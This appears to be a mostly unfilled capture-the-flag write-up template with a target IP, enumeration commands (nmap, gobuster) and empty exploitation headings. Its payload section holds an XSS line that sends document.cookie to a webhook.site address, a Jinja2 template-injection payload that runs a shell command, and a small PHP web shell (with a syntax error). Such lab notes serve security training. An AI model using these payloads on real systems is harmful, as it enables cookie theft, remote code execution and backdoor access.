---
cssclasses:
  - jbm-note
Date: 2026-07-19
---

# EXIT Challenge
---

| **Target** :LiTarget:              | *100.31.117.193*                                 |
| ---------------------------------- | ------------------------------------------------ |
| Date :LiCalendar:                  | 07/19/2026                                       |
| Tools :LiToolCase: :               | Basic tools(terminal), Burpsuite, NMAP, GOBUSTER |
| Criticality :RiAlarmWarningLine: : | **0.0**                                          |
| Challenge arrival :LiAlarmClock: : | *8:45*                                           |
| Challenge start :LiTimer: :        | *10:10*                                          |
| Challenge end :LiTimerOff: :       | *00:00*                                          |

---
# **RESULTS**
---
## Flags found
1. First flag - Passive Recon
	- *FLAG{...}*

|  No   | Vulnerability  Phase | Flag String | Criticality |
| :---: | :------------------- | :---------: | :---------: |
| **1** | Passive Recon        | `FLAG{...}` |   **Low**   |
| **2** | Active Recon         | `FLAG{...}` |   **Low**   |
| **3** | Root Access          | `FLAG{...}` |  **High**   |

---
# Preparation
---
## Tools
1. **Basic tools**
	- On :SiKalilinux: *Kali Linux*
	- NMAP
	- GOBUSTER
2. **Burpsuite**
	- Community edition

## Payloads
### XSS
```html
<img src=x onerror="fetch('https://webhook.site/72cc3984-cd94-44d1-8e1c-36bee4de7237?c='+document.cookie)"/>
```
### SSTI
```python
{{self.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('whoami').read() }}
```
### PHP
```php
<?php
if (isset($_GET('cmd'))) {
  $cmd = $_GET('cmd');
  echo (system($cmd));
}
?>
```
---
# Initial investigation/enumeration
---
## **Enumeration**
### NMAP results
#### Ports
```bash
sudo nmap -sS -p- 100.31.117.193
```
```
....
```
#### Versions
```bash
sudo nmap -sS -sV 100.31.117.193
```
```
....
```
### GOBUSTER results
```bash
gobuster dir -u http://100.31.117.193 -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,js,pdf.txt
```
```
....
```
%% ## **Vulnerability scanning** %%

---
# Exploiting and Investigation
---
## Enumeration

## Getting into the system

## Lateral movement

## Attempting reverse shell

## Advanced vulnerabilities

## Privilege escalation

